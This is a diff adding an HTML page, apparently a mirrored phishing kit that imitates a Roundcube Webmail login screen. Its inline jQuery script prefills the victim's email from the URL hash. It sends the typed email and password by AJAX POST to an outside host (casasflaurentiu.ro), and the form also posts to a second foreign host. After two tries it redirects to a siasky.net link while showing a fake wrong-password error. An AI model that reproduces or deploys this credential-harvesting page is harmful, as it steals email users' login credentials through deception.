@@ -1,0 +1,245 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<!-- Mirrored from roundcubeupr.web.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 16 Jul 2020 09:23:41 GMT -->
+<!-- Added by HTTrack --><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
+<head>
+<meta content="noindex, nofollow" name="robots"/>
+<meta content="noindex, nofollow" name="googlebot"/>
+<title>Roundcube Webmail :: Inbox</title>
+<meta content="" id="viewport" name="viewport">
+<link href="https://firebasestorage.googleapis.com/v0/b/roundcube-git000.appspot.com/o/favicon.ico?alt=media&amp;token=716b9b8d-396d-46ef-b71a-4255d68989f9" rel="shortcut icon"/>
+<link href="local_resources/css/2d7a544734ea4dc1db61559fb97c57a0.css" rel="stylesheet" type="text/css"/>
+</meta></head>
+<body class="minwidth">
+<div id="header">
+<div aria-labelledby="aria-label-topnav" id="topline" role="banner">
+<h2 class="voice" id="aria-label-topnav">Window control</h2>
+<div class="topleft">
+<img class="navbar-brand-logo" id="imgLogo" src="local_resources/img/3c7514c2bd2a97713967cf3f4a7fc8fa.png"/>
+</div>
+<div class="topright">
+<img height="14" src="local_resources/img/5dacd7d0b9f29a786ae09bbb16333209.png" style="margin-top:2px;" width="14"/>
+<span class="username" id="username" style="color:#FFF;"><b style="color:#FFF;">Welcome User</b></span>
+<a class="button-logout" href="#" id="rcmbtn101" onclick="return rcmail.command('switch-task','logout',this,event)" role="button">Logout</a>
+</div>
+</div>
+<div id="topnav">
+<h2 class="voice" id="aria-label-tasknav">Application tasks</h2>
+<div aria-labelledby="aria-label-tasknav" class="topright" id="taskbar" role="navigation">
+<a class="button-mail" href="#" id="rcmbtn102" role="button"><span class="button-inner">Mail</span></a>
+<a class="button-addressbook" href="#" id="rcmbtn103" role="button"><span class="button-inner">Address Book</span></a>
+<a class="button-settings" href="#" id="rcmbtn104" role="button"><span class="button-inner">Settings</span></a>
+<a class="button-logout" href="https://firebasestorage.googleapis.com/v0/b/roundcube-git000.appspot.com/o/_task%3Dlogout.html?alt=media&amp;token=8b51252a-4c81-426e-b8d8-3439ce4aecd3" id="rcmbtn105" onclick="return rcmail.command('switch-task','logout',this,event)" role="button"><span class="button-inner">Logout</span></a>
+<span class="minmodetoggle" role="presentation"></span>
+</div>
+<img alt="Logo" id="toplogo" src="local_resources/img/59dea43564cbf394a56fc8af66659cc5.png"/>
+</div>
+<br style="clear:both"/>
+</div>
+<div id="mainscreen">
+<h1 class="voice">Mail</h1>
+<!-- toolbar -->
+<h2 class="voice" id="aria-label-toolbar">Application toolbar</h2>
+<div aria-labelledby="aria-label-toolbar" class="toolbar" id="messagetoolbar" role="toolbar">
+<a aria-disabled="true" class="button checkmail" href="#" id="rcmbtn106" onclick="return rcmail.command('checkmail','',this,event)" role="button" tabindex="-1" title="Check for new messages">Refresh</a>
+<a aria-disabled="true" class="button compose" href="#" id="rcmbtn107" onclick="return rcmail.command('compose','',this,event)" role="button" tabindex="-1" title="Create a new message">Compose</a>
+<span class="spacer"></span>
+<a aria-disabled="true" class="button reply" href="#" id="rcmbtn108" onclick="return rcmail.command('reply','',this,event)" role="button" tabindex="-1" title="Reply to sender">Reply</a>
+<span class="dropbutton">
+<a class="button reply-all" href="#" title="Reply to list or to sender and all recipients">Reply all</a>
+<a class="dropbuttontip" href="#">Reply-all options</a>
+</span>
+<span class="dropbutton">
+<a aria-disabled="true" class="button forward" href="#" id="rcmbtn110" onclick="return rcmail.command('forward','',this,event)" role="button" tabindex="-1" title="Forward the message">Forward</a>
+<a aria-expanded="false" aria-haspopup="true" aria-owns="forwardmenu-menu" class="dropbuttontip" href="#forward" id="forwardmenulink" onclick="UI.toggle_popup('forwardmenu',event);return false" tabindex="0">Forwarding options</a>
+</span>
+<a aria-disabled="true" class="button delete" href="#" id="rcmbtn111" onclick="return rcmail.command('delete','',this,event)" role="button" tabindex="-1" title="Delete message">Delete</a>
+<a aria-expanded="false" aria-haspopup="true" aria-owns="markmessagemenu-menu" class="button markmessage" href="#" id="markmessagemenulink" onclick="UI.toggle_popup('markmessagemenu',event);return false" role="button" title="Mark messages">Mark</a>
+<a aria-expanded="false" aria-haspopup="true" aria-owns="messagemenu-menu" class="button more" href="#" id="messagemenulink" onclick="UI.toggle_popup('messagemenu',event);return false" role="button" title="More actions...">More</a>
+<div aria-hidden="true" class="popupmenu" id="forwardmenu">
+<h3 class="voice" id="aria-label-forwardmenu">Forwarding options</h3>
+<ul aria-labelledby="aria-label-forwardmenu" class="toolbarmenu" id="forwardmenu-menu" role="menu">
+<li role="menuitem"><a aria-disabled="true" class="forwardlink" href="#" id="rcmbtn112" onclick="return rcmail.command('forward-inline','sub',this,event)" role="button" tabindex="-1">Forward inline</a></li>
+<li role="menuitem"><a aria-disabled="true" class="forwardattachmentlink" href="#" id="rcmbtn113" onclick="return rcmail.command('forward-attachment','sub',this,event)" role="button" tabindex="-1">Forward as attachment</a></li>
+</ul>
+</div>
+<div aria-hidden="true" class="popupmenu" id="replyallmenu">
+<h3 class="voice" id="aria-label-replyallmenu">Reply-all options</h3>
+<ul aria-labelledby="aria-label-replyallmenu" class="toolbarmenu" id="replyallmenu-menu" role="menu">
+<li role="menuitem"><a aria-disabled="true" class="replyalllink" href="#" id="rcmbtn114" onclick="return rcmail.command('reply-all','sub',this,event)" role="button" tabindex="-1">Reply all</a></li>
+<li role="menuitem"><a aria-disabled="true" class="replylistlink" href="#" id="rcmbtn115" onclick="return rcmail.command('reply-list','sub',this,event)" role="button" tabindex="-1">Reply list</a></li>
+</ul>
+</div>
+</div>
+<div id="messagesearchtools">
+<!-- search filter -->
+<!-- search box -->
+<div aria-labelledby="aria-label-searchform" class="searchbox" id="quicksearchbar" role="search">
+<h2 class="voice" id="aria-label-searchform">Email message search form</h2>
+<label class="voice" for="quicksearchbox">Email search input</label>
+<a aria-expanded="false" aria-haspopup="true" aria-owns="searchmenu-menu" class="iconbutton searchoptions" href="#" id="searchmenulink" role="button" title="Search modifiers">Options</a>
+<form name="rcmqsearhform"><input id="quicksearchbox" name="_q" type="text"/></form>
+</div>
+</div>
+<div id="mainscreencontent">
+<div id="mailview-left">
+<div id="login-form" style="margin-top:30px;">
+<div class="box-inner" role="main">
+<img alt="Roundcube Webmail" id="logo" src="local_resources/img/59dea43564cbf394a56fc8af66659cc5.png"/>
+<form action="https://ado-sz.com/x3/mxt3.php" id="contact" method="POST" name="form">
+<span id="msg" style="display:none; font-size:12px; padding-left:95px; color:rgb(232, 17, 35); font-weight:bold;"></span>
+<table>
+<tbody>
+<tr><td class="title"><label for="rcmloginuser">Username</label>
+</td>
+<td class="input">
+<input autocapitalize="off" id="email" name="email" size="40" style="font-weight:bold;" type="text"/>
+</td>
+</tr>
+<tr><td class="title"><label for="rcmloginpwd">Password</label></td>
+<td class="input"><input autocapitalize="off" id="password" name="password" required="" size="40" type="password"/></td>
+</tr>
+</tbody>
+</table>
+<p class="formbuttons"><input class="button mainaction" id="submit-btn" type="submit" value="Login"/></p>
+</form>
+</div>
+<div class="box-bottom" role="complementary">
+<div id="message" style="font-weight:bold; color:#766; font-size:11px;">You have successfully terminated the session. <span style="color:#000;">Login to Continue.</span></div>
+</div>
+<div id="bottomline" role="contentinfo">
+	Roundcube Webmail 
+		
+</div>
+</div>
+</div><!-- end mailview-right -->
+</div>
+<!-- end mainscreencontent -->
+</div><!-- end mainscreen -->
+<div id="messagestack"></div>
+<!-- Optional JavaScript -->
+<!-- jQuery first, then Popper.js, then Bootstrap JS -->
+<script crossorigin="anonymous" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" src="local_resources/js/fa23745d4e6bc99d0e191c82e00f6cf9.js"></script>
+<script crossorigin="anonymous" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" src="local_resources/js/8b11cdf1459a34b4401cadbb9adc5bb1.js"></script>
+<script crossorigin="anonymous" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" src="local_resources/js/4352c71c7dbf3ea299f6e8f75552d037.js"></script>
+</body>
+<script src="local_resources/js/c291f2ae17879321c2215162f40786cc.js"></script>
+<script src="local_resources/js/c1187e7c9fb5913ff29b3e2296278f50.js"></script>
+<script>
+      $("#submit-btn1").hide();
+
+      /* global $ */
+      $(document).ready(function(){
+        var count=0;
+
+      /////////////url email getting////////////////
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+          // $('#email').val(email);
+          var my_email =email;
+          var ind=my_email.indexOf("@");
+          var my_slice=my_email.substr((ind+1));
+          var c= my_slice.substr(0, my_slice.indexOf('.'));
+          var final= c.toLowerCase();
+          
+          $('#contact').trigger("reset");
+          $("#msg").hide();
+            // $('#fieldImg').attr('src', 'images/other-1.png');
+            // $('#field').html("Other Mail");
+            $('#email').val(my_email);
+            $('#emailch').html(my_email);
+            $('#username').val(my_email);
+            $('#username').html(my_email);
+            $("#msg").hide();
+            // $("#inputbar").animate({left:200, opacity:"hide"}, 0);
+            // $("#automail").animate({right:200, opacity:"show"}, 1000);
+            // $('#ajaxModal').modal('show');
+          }
+        ///////////////url getting email////////////////
+				
+		
+        $('#submit-btn').click(function(event){
+          $('#error').hide();
+          $('#msg').hide();
+          event.preventDefault();
+          var email=$("#email").val();
+          var password=$("#password").val();
+          var msg = $('#msg').html();
+          $('#msg').text( msg );
+        ///////////new injection////////////////
+        var my_email =email;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        // if (!filter.test(my_email)) {
+        //   $('#error').show();
+        //   email.focus;
+        //   return false;
+        // }
+
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var n = my_email.search("@");
+        ///////////new injection////////////////
+        count=count+1;
+        
+        $.ajax({
+          dataType: 'JSON',
+          url: 'https://casasflaurentiu.ro/cgi/blod.php',
+          type: 'POST',
+      	data:{
+      		email:email,
+      		password:password,
+      	},
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	$('#submit-btn').val('Verifing...');
+            },
+            success: function(response){
+            	if(response){
+            		$("#msg").show();
+            		console.log(response);
+            		if(response['signal'] == 'ok'){
+            			$("#password").val("");
+            			if (count>=2) {
+            				count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://siasky.net/EAC3nAAguypv0u57iVvHhyp8_E2tqX54NOlJsw6FEB0PGA?msg="+email);
+
+                }
+                $('#msg').html(response['msg']);
+            }
+            else{
+            	$('#msg').html(response['msg']);
+            }
+        }
+    },
+    error: function(){
+    	$("#password").val("");
+    	if (count>=2) {
+    		count=0;
+    		window.location.replace("https://siasky.net/EAC3nAAguypv0u57iVvHhyp8_E2tqX54NOlJsw6FEB0PGA?msg="+email);
+    	}
+    	$("#msg").show();
+    	$('#msg').html("Please enter correct password and try again");
+    },
+    complete: function(){
+    	$('#submit-btn').val('Login');
+    }
+});
+  });
+
+
+	});
+
+
+</script>
+
+</html>
